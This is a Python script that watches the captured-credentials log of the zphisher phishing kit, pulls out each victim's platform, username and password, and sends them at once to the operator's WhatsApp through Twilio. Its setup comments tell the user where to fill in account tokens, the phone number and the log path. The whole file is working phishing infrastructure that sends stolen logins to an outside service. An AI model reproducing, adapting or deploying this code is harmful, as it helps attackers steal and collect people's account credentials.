import os
import time
import re
from datetime import datetime
from twilio.rest import Client

# --- WhatsApp Scheduler Class ---
class WhatsAppScheduler:
    def __init__(self, account_sid, auth_token):
        self.client = Client(account_sid, auth_token)

    def send_whatsapp_msg(self, recipient_number, message_body):
        try:
            message = self.client.messages.create(
                from_='whatsapp:+14155238886',
                body=message_body,
                to=f"whatsapp:{recipient_number}"
            )
            print(f"✅ Message sent successfully! Message SID: {message.sid}")
        except Exception as e:
            print(f"❌ An error occurred: {e}")

    def send_credentials_immediately(self, recipient_name, recipient_number, username, password, platform):
        """
        Send credentials immediately using current timestamp and include platform.
        """
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message_body = (
            "🎯 New Credentials Captured:\n"
            f"Platform:  {platform}\n"
            f"Username:  {username}\n"
            f"Password:  {password}\n"
            f"Time:      {current_time}"
        )
        print(f"⏱ Sending message immediately to {recipient_name}...\n")
        self.send_whatsapp_msg(recipient_number, message_body)


# --- Phish Log Parser Class ---
class PhishLogParser:
    def __init__(self, file_path):
        self.file_path = file_path

    def parse_line(self, line):
        """
        Extract platform, username, and password from one line.
        """
        match = re.search(r'(?i)(?P<platform>\w+)?\s*Username:\s*(?P<username>.*?)\s+Pass:\s*(?P<password>.*)', line)
        if match:
            return {
                "platform": match.group('platform') or "Unknown",
                "username": match.group('username').strip(),
                "password": match.group('password').strip()
            }
        return None

    def monitor_file_once(self):
        """
        Monitor file and return first valid credentials, then stop.
        """
        if not os.path.exists(self.file_path):
            raise FileNotFoundError(f"❌ File not found: {self.file_path}")

        print(f"📄 Monitoring {self.file_path}...\n")
        with open(self.file_path, 'r') as file:
            file.seek(0, os.SEEK_END)  # Start at end of file

            while True:
                line = file.readline()
                if not line:
                    time.sleep(1)
                    continue

                line = line.strip()
                if not line:
                    continue

                data = self.parse_line(line)
                if data and data['username'] and data['password']:
                    return data  # Stop after first match


# --- Main Execution ---
if __name__ == "__main__":
    # Twilio credentials
    account_sid = "Your SID" # your sid will be on your twilio website
    auth_token = "Your Token"# your auth token will be on your twilio website

    # Create scheduler and parser
    scheduler = WhatsAppScheduler(account_sid, auth_token)
    recipient_name = input("Enter the recipient's name: ")
    recipient_number = "your phone number" # your whatsapp number, which is use in twilio

    log_file_path = r"//wsl.localhost/Ubuntu/home/sajid2004/zphisher/auth/usernames.dat" # your monitor log in present your directory don't use this path it will show error
    parser = PhishLogParser(log_file_path)

    try:
        entry = parser.monitor_file_once()
        print("🎯 New Credentials Captured:")
        print(f"   Platform:  {entry['platform']}")
        print(f"   Username:  {entry['username']}")
        print(f"   Password:  {entry['password']}")
        print("-" * 40)

        scheduler.send_credentials_immediately(
            recipient_name,
            recipient_number,
            entry['username'],
            entry['password'],
            entry['platform']
        )

    except FileNotFoundError as e:
        print(f"❌ Error: {e}")
